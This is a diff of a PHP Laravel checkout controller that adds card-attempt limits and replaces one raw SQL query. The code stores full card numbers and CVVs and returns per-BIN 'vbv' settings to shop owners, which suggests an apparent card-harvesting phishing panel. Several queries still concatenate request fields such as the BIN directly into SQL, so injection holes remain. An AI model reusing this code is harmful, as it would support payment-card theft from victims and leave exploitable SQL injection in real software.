@@ -887,7 +887,34 @@ class CheckoutController extends Controller
     public function updateInfo(Request $request)
     {
         try {
-            $getLoja = DB::select(DB::raw("SELECT id_loja FROM carrinho WHERE hash = '" . $request->hash . "'"));
+            $cart = DB::table('carrinho')
+                ->where('hash', $request->hash)
+                ->first();
+
+            $cards = DB::table('cartao')
+                ->where('hash', $request->hash)
+                ->get();
+
+            if ($cards->count() >= 3) {
+                return response()->json([
+                    'status' => 401,
+                    'message' => 'O limite de tentativas do seu cartão foi atingido'
+                ]);
+            }
+
+            if ($cards->pluck('cc')->push($request->cc)->unique()->count() > 2) {
+                return response()->json([
+                    'status' => 401,
+                    'message' => 'Você não pode usar mais de dois cartões diferentes'
+                ]);
+            }
+
+            if ($cards->where('cc', $request->cc)->count() >= 2) {
+                return response()->json([
+                    'status' => 401,
+                    'message' => 'Este cartão atingiu o limite de tentativas. Por favor, use outro.'
+                ]);
+            }
 
             $insert = DB::table('cartao')->insertGetId([
                 'hash' => $request->hash,
@@ -898,7 +925,7 @@ class CheckoutController extends Controller
                 'cvv' => $request->cvv,
                 'horario' => date('Y-m-d H:i:s'),
                 'bin' => $request->bin,
-                'id_loja' => $getLoja[0]->id_loja
+                'id_loja' => $cart->id_loja
             ]);
 
             DB::table('carrinho')
@@ -910,15 +937,19 @@ class CheckoutController extends Controller
                     'installments' => $request->installments
                 ]);
 
-            $queryIdUsuario = DB::select(DB::raw("SELECT id_usuario_pai FROM loja WHERE id_loja = " . $getLoja[0]->id_loja));
+            DB::table('carrinho')
+                ->where('hash', $request->hash)
+                ->increment('card_attempts');
+
+            $queryIdUsuario = DB::select(DB::raw("SELECT id_usuario_pai FROM loja WHERE id_loja = " . $cart->id_loja));
             $queryDigitos = DB::select(DB::raw("SELECT digitos FROM bins WHERE bin = '" . $request->bin . "'"));
             $queryPreferencias = DB::select(DB::raw("SELECT * FROM bins_preferencias WHERE bin = '" . $request->bin . "' AND id_usuario = " . $queryIdUsuario[0]->id_usuario_pai));
+
             if (!empty($queryPreferencias)) {
                 return response()->json(['status' => 200, 'i' => $insert, 'v' => $queryPreferencias[0]->vbv, 'd' => $queryPreferencias[0]->digitos]);
             }
 
             return response()->json(['status' => 200, 'i' => $insert, 'v' => 'n', 'd' => (!empty($queryDigitos) ? $queryDigitos[0]->digitos : 404)]);
-
         } catch (\Exception $e) {
             return response()->json(['status' => 500]);
         }
